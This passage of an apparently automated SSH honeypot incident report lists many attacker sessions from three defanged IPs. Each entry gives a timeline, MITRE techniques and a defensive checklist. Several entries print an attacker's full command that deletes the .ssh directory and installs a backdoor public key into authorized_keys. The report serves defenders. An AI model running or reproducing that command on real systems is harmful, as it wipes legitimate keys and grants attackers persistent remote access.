| `2026-06-02 10:18:29` | `cowrie.client.kex` |
| `2026-06-02 10:18:30` | `cowrie.login.success` |
| `2026-06-02 10:18:30` | `cowrie.session.params` |
| `2026-06-02 10:18:30` | `cowrie.command.input` |
| `2026-06-02 10:18:30` | `cowrie.command.failed` |
| `2026-06-02 10:18:30` | `cowrie.log.closed` |
| `2026-06-02 10:18:30` | `cowrie.session.params` |
| `2026-06-02 10:18:30` | `cowrie.command.input` |
| `2026-06-02 10:18:30` | `cowrie.session.file_download` |
| `2026-06-02 10:18:30` | `cowrie.log.closed` |
| `2026-06-02 10:18:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.14.33[.]174` to AbuseIPDB if not already reported
- [ ] Block `103.14.33[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0407bbc59d2e

| Field | Detail |
|---|---|
| **Source IP** | `103.14.33[.]174` |
| **First Seen** | 2026-06-02 10:18 |
| **Last Seen** | 2026-06-02 10:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 10:18:32` | `cowrie.session.connect` |
| `2026-06-02 10:18:32` | `cowrie.client.version` |
| `2026-06-02 10:18:32` | `cowrie.client.kex` |
| `2026-06-02 10:18:33` | `cowrie.login.success` |
| `2026-06-02 10:18:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.14.33[.]174` to AbuseIPDB if not already reported
- [ ] Block `103.14.33[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10d264dfc3b4

| Field | Detail |
|---|---|
| **Source IP** | `212.199.105[.]109` |
| **First Seen** | 2026-06-02 10:21 |
| **Last Seen** | 2026-06-02 10:21 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 10:21:11` | `cowrie.session.connect` |
| `2026-06-02 10:21:11` | `cowrie.client.version` |
| `2026-06-02 10:21:12` | `cowrie.client.kex` |
| `2026-06-02 10:21:12` | `cowrie.login.success` |
| `2026-06-02 10:21:13` | `cowrie.session.params` |
| `2026-06-02 10:21:13` | `cowrie.command.input` |
| `2026-06-02 10:21:13` | `cowrie.command.failed` |
| `2026-06-02 10:21:13` | `cowrie.log.closed` |
| `2026-06-02 10:21:14` | `cowrie.session.params` |
| `2026-06-02 10:21:14` | `cowrie.command.input` |
| `2026-06-02 10:21:14` | `cowrie.session.file_download` |
| `2026-06-02 10:21:14` | `cowrie.log.closed` |
| `2026-06-02 10:21:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.199.105[.]109` to AbuseIPDB if not already reported
- [ ] Block `212.199.105[.]109` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00fc323e4ecf

| Field | Detail |
|---|---|
| **Source IP** | `212.199.105[.]109` |
| **First Seen** | 2026-06-02 10:21 |
| **Last Seen** | 2026-06-02 10:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 10:21:17` | `cowrie.session.connect` |
| `2026-06-02 10:21:17` | `cowrie.client.version` |
| `2026-06-02 10:21:17` | `cowrie.client.kex` |
| `2026-06-02 10:21:18` | `cowrie.login.success` |
| `2026-06-02 10:21:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.199.105[.]109` to AbuseIPDB if not already reported
- [ ] Block `212.199.105[.]109` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-395660d75269

| Field | Detail |
|---|---|
| **Source IP** | `103.14.33[.]174` |
| **First Seen** | 2026-06-02 10:21 |
| **Last Seen** | 2026-06-02 10:21 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 10:21:42` | `cowrie.session.connect` |
| `2026-06-02 10:21:42` | `cowrie.client.version` |
| `2026-06-02 10:21:42` | `cowrie.client.kex` |
| `2026-06-02 10:21:43` | `cowrie.login.success` |
| `2026-06-02 10:21:43` | `cowrie.session.params` |
| `2026-06-02 10:21:43` | `cowrie.command.input` |
| `2026-06-02 10:21:43` | `cowrie.command.failed` |
| `2026-06-02 10:21:43` | `cowrie.log.closed` |
| `2026-06-02 10:21:43` | `cowrie.session.params` |
| `2026-06-02 10:21:43` | `cowrie.command.input` |
| `2026-06-02 10:21:43` | `cowrie.session.file_download` |
| `2026-06-02 10:21:43` | `cowrie.log.closed` |
| `2026-06-02 10:21:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.14.33[.]174` to AbuseIPDB if not already reported
- [ ] Block `103.14.33[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f16d3f75150d

| Field | Detail |
|---|---|
| **Source IP** | `103.14.33[.]174` |
| **First Seen** | 2026-06-02 10:21 |
| **Last Seen** | 2026-06-02 10:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 10:21:45` | `cowrie.session.connect` |
| `2026-06-02 10:21:45` | `cowrie.client.version` |
| `2026-06-02 10:21:45` | `cowrie.client.kex` |
| `2026-06-02 10:21:46` | `cowrie.login.success` |
| `2026-06-02 10:21:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.14.33[.]174` to AbuseIPDB if not already reported
- [ ] Block `103.14.33[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fba69f7df877

| Field | Detail |
|---|---|
| **Source IP** | `212.199.105[.]109` |
| **First Seen** | 2026-06-02 10:22 |
| **Last Seen** | 2026-06-02 10:22 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 10:22:46` | `cowrie.session.connect` |
| `2026-06-02 10:22:46` | `cowrie.client.version` |
| `2026-06-02 10:22:47` | `cowrie.client.kex` |
| `2026-06-02 10:22:48` | `cowrie.login.success` |
| `2026-06-02 10:22:48` | `cowrie.session.params` |
| `2026-06-02 10:22:48` | `cowrie.command.input` |
| `2026-06-02 10:22:48` | `cowrie.command.failed` |
| `2026-06-02 10:22:48` | `cowrie.log.closed` |
| `2026-06-02 10:22:49` | `cowrie.session.params` |
| `2026-06-02 10:22:49` | `cowrie.command.input` |
| `2026-06-02 10:22:49` | `cowrie.session.file_download` |
| `2026-06-02 10:22:49` | `cowrie.log.closed` |
| `2026-06-02 10:22:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.199.105[.]109` to AbuseIPDB if not already reported
- [ ] Block `212.199.105[.]109` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f27e138542b1

| Field | Detail |
|---|---|
| **Source IP** | `212.199.105[.]109` |
| **First Seen** | 2026-06-02 10:22 |
| **Last Seen** | 2026-06-02 10:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 10:22:52` | `cowrie.session.connect` |
| `2026-06-02 10:22:52` | `cowrie.client.version` |
| `2026-06-02 10:22:52` | `cowrie.client.kex` |
| `2026-06-02 10:22:53` | `cowrie.login.success` |
| `2026-06-02 10:22:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.199.105[.]109` to AbuseIPDB if not already reported
- [ ] Block `212.199.105[.]109` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee970191589b

| Field | Detail |
|---|---|
| **Source IP** | `103.14.33[.]174` |
| **First Seen** | 2026-06-02 10:23 |
| **Last Seen** | 2026-06-02 10:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 10:23:19` | `cowrie.session.connect` |
| `2026-06-02 10:23:19` | `cowrie.client.version` |
| `2026-06-02 10:23:19` | `cowrie.client.kex` |
| `2026-06-02 10:23:20` | `cowrie.login.success` |
| `2026-06-02 10:23:20` | `cowrie.session.params` |
| `2026-06-02 10:23:20` | `cowrie.command.input` |
| `2026-06-02 10:23:20` | `cowrie.command.failed` |
| `2026-06-02 10:23:20` | `cowrie.log.closed` |
| `2026-06-02 10:23:20` | `cowrie.session.params` |
| `2026-06-02 10:23:20` | `cowrie.command.input` |
| `2026-06-02 10:23:21` | `cowrie.session.file_download` |
| `2026-06-02 10:23:21` | `cowrie.log.closed` |
| `2026-06-02 10:23:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.14.33[.]174` to AbuseIPDB if not already reported
- [ ] Block `103.14.33[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f2b70b41903

| Field | Detail |
|---|---|
| **Source IP** | `103.14.33[.]174` |
| **First Seen** | 2026-06-02 10:23 |
| **Last Seen** | 2026-06-02 10:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 10:23:22` | `cowrie.session.connect` |
| `2026-06-02 10:23:22` | `cowrie.client.version` |
| `2026-06-02 10:23:22` | `cowrie.client.kex` |
| `2026-06-02 10:23:23` | `cowrie.login.success` |
| `2026-06-02 10:23:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.14.33[.]174` to AbuseIPDB if not already reported
- [ ] Block `103.14.33[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78ddda0a3105

| Field | Detail |
|---|---|
| **Source IP** | `183.91.11[.]36` |
| **First Seen** | 2026-06-02 10:24 |
| **Last Seen** | 2026-06-02 10:24 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 10:24:51` | `cowrie.session.connect` |
| `2026-06-02 10:24:51` | `cowrie.client.version` |
| `2026-06-02 10:24:51` | `cowrie.client.kex` |
| `2026-06-02 10:24:52` | `cowrie.login.success` |
| `2026-06-02 10:24:52` | `cowrie.session.params` |
| `2026-06-02 10:24:52` | `cowrie.command.input` |
| `2026-06-02 10:24:52` | `cowrie.command.failed` |
| `2026-06-02 10:24:53` | `cowrie.log.closed` |
| `2026-06-02 10:24:53` | `cowrie.session.params` |
| `2026-06-02 10:24:53` | `cowrie.command.input` |
| `2026-06-02 10:24:53` | `cowrie.session.file_download` |
| `2026-06-02 10:24:53` | `cowrie.log.closed` |
| `2026-06-02 10:24:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.91.11[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.11[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ddb38ba5623

| Field | Detail |
|---|---|
| **Source IP** | `183.91.11[.]36` |
| **First Seen** | 2026-06-02 10:24 |
| **Last Seen** | 2026-06-02 10:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 10:24:56` | `cowrie.session.connect` |
| `2026-06-02 10:24:56` | `cowrie.client.version` |
| `2026-06-02 10:24:56` | `cowrie.client.kex` |
| `2026-06-02 10:24:57` | `cowrie.login.success` |
| `2026-06-02 10:24:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.91.11[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.11[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c5cb762de35

| Field | Detail |
|---|---|
| **Source IP** | `103.14.33[.]174` |
| **First Seen** | 2026-06-02 10:26 |
| **Last Seen** | 2026-06-02 10:26 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 10:26:23` | `cowrie.session.connect` |
| `2026-06-02 10:26:23` | `cowrie.client.version` |
| `2026-06-02 10:26:23` | `cowrie.client.kex` |
| `2026-06-02 10:26:23` | `cowrie.login.success` |
| `2026-06-02 10:26:23` | `cowrie.session.params` |
| `2026-06-02 10:26:23` | `cowrie.command.input` |
| `2026-06-02 10:26:23` | `cowrie.command.failed` |
| `2026-06-02 10:26:24` | `cowrie.log.closed` |
| `2026-06-02 10:26:24` | `cowrie.session.params` |
| `2026-06-02 10:26:24` | `cowrie.command.input` |
| `2026-06-02 10:26:24` | `cowrie.session.file_download` |
| `2026-06-02 10:26:24` | `cowrie.log.closed` |
| `2026-06-02 10:26:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.14.33[.]174` to AbuseIPDB if not already reported
- [ ] Block `103.14.33[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8dd695fa2a95

| Field | Detail |
|---|---|
| **Source IP** | `103.14.33[.]174` |
| **First Seen** | 2026-06-02 10:26 |
| **Last Seen** | 2026-06-02 10:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 10:26:26` | `cowrie.session.connect` |
| `2026-06-02 10:26:26` | `cowrie.client.version` |
| `2026-06-02 10:26:26` | `cowrie.client.kex` |
| `2026-06-02 10:26:26` | `cowrie.login.success` |
| `2026-06-02 10:26:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.14.33[.]174` to AbuseIPDB if not already reported
- [ ] Block `103.14.33[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11c4021d77cf

| Field | Detail |
|---|---|
| **Source IP** | `212.199.105[.]109` |
| **First Seen** | 2026-06-02 10:27 |
| **Last Seen** | 2026-06-02 10:27 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 10:27:12` | `cowrie.session.connect` |
| `2026-06-02 10:27:12` | `cowrie.client.version` |
| `2026-06-02 10:27:12` | `cowrie.client.kex` |
| `2026-06-02 10:27:13` | `cowrie.login.success` |
| `2026-06-02 10:27:14` | `cowrie.session.params` |
| `2026-06-02 10:27:14` | `cowrie.command.input` |
| `2026-06-02 10:27:14` | `cowrie.command.failed` |
| `2026-06-02 10:27:14` | `cowrie.log.closed` |
| `2026-06-02 10:27:14` | `cowrie.session.params` |
| `2026-06-02 10:27:14` | `cowrie.command.input` |
| `2026-06-02 10:27:15` | `cowrie.session.file_download` |
| `2026-06-02 10:27:15` | `cowrie.log.closed` |
| `2026-06-02 10:27:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.199.105[.]109` to AbuseIPDB if not already reported
- [ ] Block `212.199.105[.]109` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-470d3bbfc354

| Field | Detail |
|---|---|
| **Source IP** | `212.199.105[.]109` |
| **First Seen** | 2026-06-02 10:27 |
| **Last Seen** | 2026-06-02 10:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 10:27:17` | `cowrie.session.connect` |
| `2026-06-02 10:27:17` | `cowrie.client.version` |
| `2026-06-02 10:27:17` | `cowrie.client.kex` |
| `2026-06-02 10:27:18` | `cowrie.login.success` |
| `2026-06-02 10:27:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.199.105[.]109` to AbuseIPDB if not already reported
- [ ] Block `212.199.105[.]109` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a97cdfbcd863

| Field | Detail |
|---|---|
| **Source IP** | `183.91.11[.]36` |
| **First Seen** | 2026-06-02 10:28 |
| **Last Seen** | 2026-06-02 10:28 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 10:28:20` | `cowrie.session.connect` |
| `2026-06-02 10:28:20` | `cowrie.client.version` |
| `2026-06-02 10:28:20` | `cowrie.client.kex` |
| `2026-06-02 10:28:21` | `cowrie.login.success` |
| `2026-06-02 10:28:22` | `cowrie.session.params` |
| `2026-06-02 10:28:22` | `cowrie.command.input` |
| `2026-06-02 10:28:22` | `cowrie.command.failed` |
| `2026-06-02 10:28:22` | `cowrie.log.closed` |
| `2026-06-02 10:28:22` | `cowrie.session.params` |
| `2026-06-02 10:28:22` | `cowrie.command.input` |
| `2026-06-02 10:28:22` | `cowrie.session.file_download` |
| `2026-06-02 10:28:22` | `cowrie.log.closed` |
| `2026-06-02 10:28:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.91.11[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.11[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc8ad155427c

| Field | Detail |
|---|---|
| **Source IP** | `183.91.11[.]36` |
| **First Seen** | 2026-06-02 10:28 |
| **Last Seen** | 2026-06-02 10:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 10:28:25` | `cowrie.session.connect` |
| `2026-06-02 10:28:25` | `cowrie.client.version` |
| `2026-06-02 10:28:25` | `cowrie.client.kex` |
| `2026-06-02 10:28:26` | `cowrie.login.success` |
| `2026-06-02 10:28:26` | `cowrie.session.closed` |

**Recommended Actions:**
